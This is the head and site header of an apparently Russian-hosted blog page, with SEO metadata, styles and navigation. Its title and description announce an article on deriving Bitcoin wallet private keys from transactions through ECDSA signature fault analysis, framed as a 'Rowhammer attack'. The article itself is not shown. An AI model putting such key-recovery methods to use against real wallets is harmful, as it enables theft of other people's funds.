<!DOCTYPE html>
<!-- saved from url=(0014)about:internet -->
<html lang="ru-RU"><head><meta http-equiv="Content-Type" content="text/html; charset=UTF-8">
	
	<meta name="viewport" content="width=device-width, initial-scale=1">
	<link rel="profile" href="https://gmpg.org/xfn/11">

	<meta name="robots" content="index, follow, max-image-preview:large, max-snippet:-1, max-video-preview:-1">

	<!-- This site is optimized with the Yoast SEO plugin v19.9 - https://yoast.com/wordpress/plugins/seo/ -->
	<style type="text/css"></style><title>How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin) - «CRYPTO DEEP TECH»</title>
	<meta name="description" content="In this article, we will apply ECDSA Signature Differential Failure Analysis and derive a private key from a transaction for five different Bitcoin Wallets.Rowhammer Attack on Bitcoin, allows us to efficiently find all zeros for normalized polynomials modulo a certain value, and we adapt this method to the ECDSA signature algorithm, more precisely to critically vulnerable transactions in the Bitcoin blockchain.">
	<link rel="canonical" href="https://cryptodeeptech.ru/rowhammer-attack/">
	<meta property="og:locale" content="ru_RU">
	<meta property="og:type" content="article">
	<meta property="og:title" content="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin) - «CRYPTO DEEP TECH»">
	<meta property="og:description" content="In this article, we will apply ECDSA Signature Differential Failure Analysis and derive a private key from a transaction for five different Bitcoin Wallets.Rowhammer Attack on Bitcoin, allows us to efficiently find all zeros for normalized polynomials modulo a certain value, and we adapt this method to the ECDSA signature algorithm, more precisely to critically vulnerable transactions in the Bitcoin blockchain.">
	<meta property="og:url" content="https://cryptodeeptech.ru/rowhammer-attack/">
	<meta property="og:site_name" content="«CRYPTO DEEP TECH»">
	<meta property="article:published_time" content="2022-10-30T15:32:56+00:00">
	<meta property="article:modified_time" content="2022-10-30T16:16:44+00:00">
	<meta property="og:image" content="https://cryptodeep.ru/wp-content/uploads/2022/10/image-107.png">
	<meta name="author" content="Crypto Deep Tech">
	<meta name="twitter:card" content="summary_large_image">
	<meta name="twitter:label1" content="Написано автором">
	<meta name="twitter:data1" content="Crypto Deep Tech">
	<meta name="twitter:label2" content="Примерное время для чтения">
	<meta name="twitter:data2" content="50 минут">
	<script async="" src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/tag.js"></script><script type="application/ld+json" class="yoast-schema-graph">{"@context":"https://schema.org","@graph":[{"@type":"Article","@id":"https://cryptodeeptech.ru/rowhammer-attack/#article","isPartOf":{"@id":"https://cryptodeeptech.ru/rowhammer-attack/"},"author":{"name":"Crypto Deep Tech","@id":"https://cryptodeeptech.ru/#/schema/person/0ef8ac0f63991970628a3a6587f9e6c0"},"headline":"How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)","datePublished":"2022-10-30T15:32:56+00:00","dateModified":"2022-10-30T16:16:44+00:00","mainEntityOfPage":{"@id":"https://cryptodeeptech.ru/rowhammer-attack/"},"wordCount":3459,"publisher":{"@id":"https://cryptodeeptech.ru/#organization"},"image":{"@id":"https://cryptodeeptech.ru/rowhammer-attack/#primaryimage"},"thumbnailUrl":"https://cryptodeep.ru/wp-content/uploads/2022/10/image-107.png","articleSection":["Cryptanalysis"],"inLanguage":"ru-RU"},{"@type":"WebPage","@id":"https://cryptodeeptech.ru/rowhammer-attack/","url":"https://cryptodeeptech.ru/rowhammer-attack/","name":"How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin) - «CRYPTO DEEP TECH»","isPartOf":{"@id":"https://cryptodeeptech.ru/#website"},"primaryImageOfPage":{"@id":"https://cryptodeeptech.ru/rowhammer-attack/#primaryimage"},"image":{"@id":"https://cryptodeeptech.ru/rowhammer-attack/#primaryimage"},"thumbnailUrl":"https://cryptodeep.ru/wp-content/uploads/2022/10/image-107.png","datePublished":"2022-10-30T15:32:56+00:00","dateModified":"2022-10-30T16:16:44+00:00","description":"In this article, we will apply ECDSA Signature Differential Failure Analysis and derive a private key from a transaction for five different Bitcoin Wallets.Rowhammer Attack on Bitcoin, allows us to efficiently find all zeros for normalized polynomials modulo a certain value, and we adapt this method to the ECDSA signature algorithm, more precisely to critically vulnerable transactions in the Bitcoin blockchain.","breadcrumb":{"@id":"https://cryptodeeptech.ru/rowhammer-attack/#breadcrumb"},"inLanguage":"ru-RU","potentialAction":[{"@type":"ReadAction","target":["https://cryptodeeptech.ru/rowhammer-attack/"]}]},{"@type":"ImageObject","inLanguage":"ru-RU","@id":"https://cryptodeeptech.ru/rowhammer-attack/#primaryimage","url":"https://cryptodeep.ru/wp-content/uploads/2022/10/image-107.png","contentUrl":"https://cryptodeep.ru/wp-content/uploads/2022/10/image-107.png"},{"@type":"BreadcrumbList","@id":"https://cryptodeeptech.ru/rowhammer-attack/#breadcrumb","itemListElement":[{"@type":"ListItem","position":1,"name":"Главная страница","item":"https://cryptodeeptech.ru/"},{"@type":"ListItem","position":2,"name":"How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)"}]},{"@type":"WebSite","@id":"https://cryptodeeptech.ru/#website","url":"https://cryptodeeptech.ru/","name":"«CRYPTO DEEP TECH»","description":"Cryptanalysis and data financial security services","publisher":{"@id":"https://cryptodeeptech.ru/#organization"},"potentialAction":[{"@type":"SearchAction","target":{"@type":"EntryPoint","urlTemplate":"https://cryptodeeptech.ru/?s={search_term_string}"},"query-input":"required name=search_term_string"}],"inLanguage":"ru-RU"},{"@type":"Organization","@id":"https://cryptodeeptech.ru/#organization","name":"«CRYPTO DEEP TECH»","url":"https://cryptodeeptech.ru/","logo":{"@type":"ImageObject","inLanguage":"ru-RU","@id":"https://cryptodeeptech.ru/#/schema/logo/image/","url":"https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png","contentUrl":"https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png","width":1279,"height":319,"caption":"«CRYPTO DEEP TECH»"},"image":{"@id":"https://cryptodeeptech.ru/#/schema/logo/image/"}},{"@type":"Person","@id":"https://cryptodeeptech.ru/#/schema/person/0ef8ac0f63991970628a3a6587f9e6c0","name":"Crypto Deep Tech","sameAs":["https://cryptodeeptech.ru","https://www.youtube.com/channel/UCd8W6qtRSiBn0Q0wy6HuNkQ/"],"url":"https://cryptodeeptech.ru/author/cryptodeeptech/"}]}</script>
	<!-- / Yoast SEO plugin. -->


<link rel="dns-prefetch" href="https://fonts.googleapis.com/">
<link rel="alternate" type="application/rss+xml" title="«CRYPTO DEEP TECH» » Лента" href="https://cryptodeeptech.ru/feed/">
<link rel="alternate" type="application/rss+xml" title="«CRYPTO DEEP TECH» » Лента комментариев" href="https://cryptodeeptech.ru/comments/feed/">
<link rel="stylesheet" id="itng-block-style-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_8f426a1779caff96bb3f2afbcff86bc9.css" media="all">
<link rel="stylesheet" id="wp-block-library-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/style.min.css" media="all">
<style id="global-styles-inline-css">
body{--wp--preset--color--black: #000000;--wp--preset--color--cyan-bluish-gray: #abb8c3;--wp--preset--color--white: #ffffff;--wp--preset--color--pale-pink: #f78da7;--wp--preset--color--vivid-red: #cf2e2e;--wp--preset--color--luminous-vivid-orange: #ff6900;--wp--preset--color--luminous-vivid-amber: #fcb900;--wp--preset--color--light-green-cyan: #7bdcb5;--wp--preset--color--vivid-green-cyan: #00d084;--wp--preset--color--pale-cyan-blue: #8ed1fc;--wp--preset--color--vivid-cyan-blue: #0693e3;--wp--preset--color--vivid-purple: #9b51e0;--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple: linear-gradient(135deg,rgba(6,147,227,1) 0%,rgb(155,81,224) 100%);--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan: linear-gradient(135deg,rgb(122,220,180) 0%,rgb(0,208,130) 100%);--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange: linear-gradient(135deg,rgba(252,185,0,1) 0%,rgba(255,105,0,1) 100%);--wp--preset--gradient--luminous-vivid-orange-to-vivid-red: linear-gradient(135deg,rgba(255,105,0,1) 0%,rgb(207,46,46) 100%);--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray: linear-gradient(135deg,rgb(238,238,238) 0%,rgb(169,184,195) 100%);--wp--preset--gradient--cool-to-warm-spectrum: linear-gradient(135deg,rgb(74,234,220) 0%,rgb(151,120,209) 20%,rgb(207,42,186) 40%,rgb(238,44,130) 60%,rgb(251,105,98) 80%,rgb(254,248,76) 100%);--wp--preset--gradient--blush-light-purple: linear-gradient(135deg,rgb(255,206,236) 0%,rgb(152,150,240) 100%);--wp--preset--gradient--blush-bordeaux: linear-gradient(135deg,rgb(254,205,165) 0%,rgb(254,45,45) 50%,rgb(107,0,62) 100%);--wp--preset--gradient--luminous-dusk: linear-gradient(135deg,rgb(255,203,112) 0%,rgb(199,81,192) 50%,rgb(65,88,208) 100%);--wp--preset--gradient--pale-ocean: linear-gradient(135deg,rgb(255,245,203) 0%,rgb(182,227,212) 50%,rgb(51,167,181) 100%);--wp--preset--gradient--electric-grass: linear-gradient(135deg,rgb(202,248,128) 0%,rgb(113,206,126) 100%);--wp--preset--gradient--midnight: linear-gradient(135deg,rgb(2,3,129) 0%,rgb(40,116,252) 100%);--wp--preset--duotone--dark-grayscale: url('#wp-duotone-dark-grayscale');--wp--preset--duotone--grayscale: url('#wp-duotone-grayscale');--wp--preset--duotone--purple-yellow: url('#wp-duotone-purple-yellow');--wp--preset--duotone--blue-red: url('#wp-duotone-blue-red');--wp--preset--duotone--midnight: url('#wp-duotone-midnight');--wp--preset--duotone--magenta-yellow: url('#wp-duotone-magenta-yellow');--wp--preset--duotone--purple-green: url('#wp-duotone-purple-green');--wp--preset--duotone--blue-orange: url('#wp-duotone-blue-orange');--wp--preset--font-size--small: 13px;--wp--preset--font-size--medium: 20px;--wp--preset--font-size--large: 36px;--wp--preset--font-size--x-large: 42px;}.has-black-color{color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-color{color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-color{color: var(--wp--preset--color--white) !important;}.has-pale-pink-color{color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-color{color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-color{color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-color{color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-color{color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-color{color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-color{color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-color{color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-color{color: var(--wp--preset--color--vivid-purple) !important;}.has-black-background-color{background-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-background-color{background-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-background-color{background-color: var(--wp--preset--color--white) !important;}.has-pale-pink-background-color{background-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-background-color{background-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-background-color{background-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-background-color{background-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-background-color{background-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-background-color{background-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-background-color{background-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-background-color{background-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-background-color{background-color: var(--wp--preset--color--vivid-purple) !important;}.has-black-border-color{border-color: var(--wp--preset--color--black) !important;}.has-cyan-bluish-gray-border-color{border-color: var(--wp--preset--color--cyan-bluish-gray) !important;}.has-white-border-color{border-color: var(--wp--preset--color--white) !important;}.has-pale-pink-border-color{border-color: var(--wp--preset--color--pale-pink) !important;}.has-vivid-red-border-color{border-color: var(--wp--preset--color--vivid-red) !important;}.has-luminous-vivid-orange-border-color{border-color: var(--wp--preset--color--luminous-vivid-orange) !important;}.has-luminous-vivid-amber-border-color{border-color: var(--wp--preset--color--luminous-vivid-amber) !important;}.has-light-green-cyan-border-color{border-color: var(--wp--preset--color--light-green-cyan) !important;}.has-vivid-green-cyan-border-color{border-color: var(--wp--preset--color--vivid-green-cyan) !important;}.has-pale-cyan-blue-border-color{border-color: var(--wp--preset--color--pale-cyan-blue) !important;}.has-vivid-cyan-blue-border-color{border-color: var(--wp--preset--color--vivid-cyan-blue) !important;}.has-vivid-purple-border-color{border-color: var(--wp--preset--color--vivid-purple) !important;}.has-vivid-cyan-blue-to-vivid-purple-gradient-background{background: var(--wp--preset--gradient--vivid-cyan-blue-to-vivid-purple) !important;}.has-light-green-cyan-to-vivid-green-cyan-gradient-background{background: var(--wp--preset--gradient--light-green-cyan-to-vivid-green-cyan) !important;}.has-luminous-vivid-amber-to-luminous-vivid-orange-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-amber-to-luminous-vivid-orange) !important;}.has-luminous-vivid-orange-to-vivid-red-gradient-background{background: var(--wp--preset--gradient--luminous-vivid-orange-to-vivid-red) !important;}.has-very-light-gray-to-cyan-bluish-gray-gradient-background{background: var(--wp--preset--gradient--very-light-gray-to-cyan-bluish-gray) !important;}.has-cool-to-warm-spectrum-gradient-background{background: var(--wp--preset--gradient--cool-to-warm-spectrum) !important;}.has-blush-light-purple-gradient-background{background: var(--wp--preset--gradient--blush-light-purple) !important;}.has-blush-bordeaux-gradient-background{background: var(--wp--preset--gradient--blush-bordeaux) !important;}.has-luminous-dusk-gradient-background{background: var(--wp--preset--gradient--luminous-dusk) !important;}.has-pale-ocean-gradient-background{background: var(--wp--preset--gradient--pale-ocean) !important;}.has-electric-grass-gradient-background{background: var(--wp--preset--gradient--electric-grass) !important;}.has-midnight-gradient-background{background: var(--wp--preset--gradient--midnight) !important;}.has-small-font-size{font-size: var(--wp--preset--font-size--small) !important;}.has-medium-font-size{font-size: var(--wp--preset--font-size--medium) !important;}.has-large-font-size{font-size: var(--wp--preset--font-size--large) !important;}.has-x-large-font-size{font-size: var(--wp--preset--font-size--x-large) !important;}
</style>
<link rel="stylesheet" id="wp-date-remover-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_e6094661d8923e95b233019ebff7c8f0.css" media="all">
<link rel="stylesheet" id="itng-fonts-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/css" media="all">
<link rel="stylesheet" id="itng-style-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_8de4505c66a21eefd3c1c98b6400e4e1.css" media="all">
<link rel="stylesheet" id="itng-main-style-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_d1cf6f49400112d539e59eee9b75e10d.css" media="all">
<style id="itng-main-style-inline-css">
.custom-logo-link img {width: 400px;}@media screen and (min-width: 992px) {#header-image .header-overlay {
            opacity: 0.01;
        }}
ins,
	.nav-wrapper,
	#menu,
	.main-navigation ul#menu-desktop ul,
	#itng-featured-news .slider-post-wrapper .posted-on a,
	#itng-featured-news #itng-featured-news-list-container .posted-on a,
	#itng-featured-posts .itng-featured-post-date,
	#itng-featured-news #itng-featured-news-carousel-container .posted-on a,
	#colophon,
	[class^=itng-search] form,
	#itng-featured-cat .featured-cat-thumb h2,
	#itng-featured-cat .featured-cat-thumb h3
	{background-color: #008bca}article .entry-meta a,
	article .blog-footer,
	article .blog-footer a,
	.widget a,
	.nav-links a,
	.itng-pagination .nav-links > a,
	.itng-pagination .dots
	{color: #008bca !important}blockquote,
	#itng-content-title span
	{border-color: #008bca}button.top-menu-mobile
	{background-color: #43bdf2 !important}#footer-sidebar .widget-title
	{color: #43bdf2 !important}
</style>
<link rel="stylesheet" id="bootstrap-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_d26191bd0380b0cf97525a613b8b566c.css" media="all">
<link rel="stylesheet" id="owl-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_c8322bd5bffc8e2856f2cbcd03c61d18.css" media="all">
<link rel="stylesheet" id="mag-popup-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_30b593b71d7672658f89bfea0ab360c9.css" media="all">
<link rel="stylesheet" id="font-awesome-css" href="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_c495654869785bc3df60216616814ad1.css" media="all">
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/jquery.min.js" id="jquery-core-js"></script>
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/jquery-migrate.min.js" id="jquery-migrate-js"></script>
<script src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/wmac_single_49cea0a781874a962879c2caca9bc322.js" id="wp-date-remover-js"></script>
<link rel="https://api.w.org/" href="https://cryptodeeptech.ru/wp-json/"><link rel="alternate" type="application/json" href="https://cryptodeeptech.ru/wp-json/wp/v2/posts/650"><meta name="generator" content="WordPress 6.0.3">
<link rel="alternate" type="application/json+oembed" href="https://cryptodeeptech.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcryptodeeptech.ru%2Frowhammer-attack%2F">
<link rel="alternate" type="text/xml+oembed" href="https://cryptodeeptech.ru/wp-json/oembed/1.0/embed?url=https%3A%2F%2Fcryptodeeptech.ru%2Frowhammer-attack%2F&amp;format=xml">
<!-- Analytics by WP Statistics v13.2.7 - https://wp-statistics.com/ -->
<script>var WP_Statistics_http = new XMLHttpRequest();WP_Statistics_http.open('GET', 'https://cryptodeeptech.ru/wp-json/wp-statistics/v2/hit?_=1667146605&_wpnonce=9e8887e2d4&wp_statistics_hit_rest=yes&referred=https%3A%2F%2Fcryptodeeptech.ru%2Frowhammer-attack%2F&exclusion_match=yes&exclusion_reason=CrawlerDetect&track_all=1&current_page_type=post&current_page_id=650&search_query&page_uri=/rowhammer-attack/', true);WP_Statistics_http.setRequestHeader("Content-Type", "application/json;charset=UTF-8");WP_Statistics_http.send(null);</script>
		<style type="text/css">
						#header-image {
						background-image: url(https://cryptodeeptech.ru/wp-content/uploads/2022/07/header3.jpg);
						background-size: cover;
						background-repeat: repeat;
						background-position: center center;
				}
							.site-title, .site-description {
				display: none;
				position: absolute;
				clip: rect(1px, 1px, 1px, 1px);
				}
					</style>
		<style id="custom-background-css">
body.custom-background { background-color: #eff3fd; }
</style>
	<link rel="icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-32x32.png" sizes="32x32">
<link rel="icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-192x192.png" sizes="192x192">
<link rel="apple-touch-icon" href="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-180x180.png">
<meta name="msapplication-TileImage" content="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-favicon7-270x270.png">
</head>

<body data-rsssl="1" class="post-template-default single single-post postid-650 single-format-standard custom-background wp-custom-logo no-sidebar">
<svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-dark-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 0.49803921568627"></fefuncr><fefuncg type="table" tableValues="0 0.49803921568627"></fefuncg><fefuncb type="table" tableValues="0 0.49803921568627"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-grayscale"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 1"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0 1"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.54901960784314 0.98823529411765"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0.71764705882353 0.25490196078431"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-red"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 1"></fefuncr><fefuncg type="table" tableValues="0 0.27843137254902"></fefuncg><fefuncb type="table" tableValues="0.5921568627451 0.27843137254902"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-midnight"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0 0"></fefuncr><fefuncg type="table" tableValues="0 0.64705882352941"></fefuncg><fefuncb type="table" tableValues="0 1"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-magenta-yellow"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.78039215686275 1"></fefuncr><fefuncg type="table" tableValues="0 0.94901960784314"></fefuncg><fefuncb type="table" tableValues="0.35294117647059 0.47058823529412"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-purple-green"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.65098039215686 0.40392156862745"></fefuncr><fefuncg type="table" tableValues="0 1"></fefuncg><fefuncb type="table" tableValues="0.44705882352941 0.4"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><svg xmlns="http://www.w3.org/2000/svg" viewBox="0 0 0 0" width="0" height="0" focusable="false" role="none" style="visibility: hidden; position: absolute; left: -9999px; overflow: hidden;"><defs><filter id="wp-duotone-blue-orange"><fecolormatrix color-interpolation-filters="sRGB" type="matrix" values=" .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 .299 .587 .114 0 0 "></fecolormatrix><fecomponenttransfer color-interpolation-filters="sRGB"><fefuncr type="table" tableValues="0.098039215686275 1"></fefuncr><fefuncg type="table" tableValues="0 0.66274509803922"></fefuncg><fefuncb type="table" tableValues="0.84705882352941 0.41960784313725"></fefuncb><fefunca type="table" tableValues="1 1"></fefunca></fecomponenttransfer><fecomposite in2="SourceGraphic" operator="in"></fecomposite></filter></defs></svg><div id="page" class="site">
	<a class="skip-link screen-reader-text" href="https://cryptodeeptech.ru/rowhammer-attack/#primary">Skip to content</a>

	
	    <header id="masthead" class="site-header style-1">

		    
	        <div id="header-image">
		        <div class="site-branding">
					<a href="https://cryptodeeptech.ru/" class="custom-logo-link" rel="home"><img width="1279" height="319" src="./How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault Rowhammer Attack on Bitcoin CRYPTO DEEP TECH_files/cropped-header4.png" class="custom-logo" alt="«CRYPTO DEEP TECH»" srcset="https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4.png 1279w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-300x75.png 300w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-1024x255.png 1024w, https://cryptodeeptech.ru/wp-content/uploads/2022/07/cropped-header4-768x192.png 768w" sizes="(max-width: 1279px) 100vw, 1279px" title="How to Get a Private Key to a Bitcoin Wallet Using a Signature Fault (Rowhammer Attack on Bitcoin)"></a>	<h2 class="site-title"><a href="https://cryptodeeptech.ru/" rel="home">«CRYPTO DEEP TECH»</a></h2>
		<p class="site-description">Cryptanalysis and data financial security services</p>
	        	</div>
				<div class="header-overlay"></div>
	        </div>

			<div class="nav-wrapper">
				 <div class="container">
					 <div class="d-flex">

						<div id="site-navigation" class="main-navigation col-lg-11" role="navigation">
							<ul id="menu-desktop" class="menu"><li id="menu-item-229" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-229"><a href="https://cryptodeeptech.ru/">HOME</a></li>
<li id="menu-item-225" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-225"><a href="https://cryptodeeptech.ru/publication/">PUBLICATIONS</a></li>
<li id="menu-item-226" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-226"><a href="https://cryptodeeptech.ru/study/">STUDY</a></li>
<li id="menu-item-227" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-227"><a href="https://cryptodeeptech.ru/resources/">RESOURCES</a></li>
<li id="menu-item-228" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-228"><a href="https://cryptodeeptech.ru/contacts/">CONTACTS</a></li>
<li id="menu-item-240" class="menu-item menu-item-type-post_type menu-item-object-post menu-item-240"><a href="https://cryptodeeptech.ru/lattice-attack/">BLOG</a></li>
<li id="menu-item-541" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-541"><a href="https://cryptodeeptech.ru/eng/">ENG</a></li>
<li id="menu-item-542" class="menu-item menu-item-type-post_type menu-item-object-page menu-item-542"><a href="https://cryptodeeptech.ru/rus/">RUS</a></li>
</ul>						</div>

						<button href="#menu" class="menu-link mobile-nav-btn col-auto"><i class="fa fa-bars" aria-hidden="true"></i></button>

						<div id="search-wrapper" class="ml-auto col-auto d-flex">
							<button type="button" id="go-to-field" tabindex="-1"></button>
					    	<button class="search-btn-main"><i class="fa fa-search"></i></button>
					    	
<div class="itng-search-main">
	<form role="search" method="get" class="search-form" action="https://cryptodeeptech.ru/">
				<label>
					<span class="screen-reader-text">Найти:</span>
					<input type="search" class="search-field" placeholder="Поиск…" value="" name="s">
				</label>
				<input type="submit" class="search-submit" value="Поиск">
			</form>	<button type="button" id="go-to-btn" tabindex="-1"></button>
</div>
						</div>
					</div>
				</div>
			</div>

		</header><!-- #masthead -->
			<div id="content-wrapper" class="container row">
		
	<main id="primary" class="site-main container order-1">
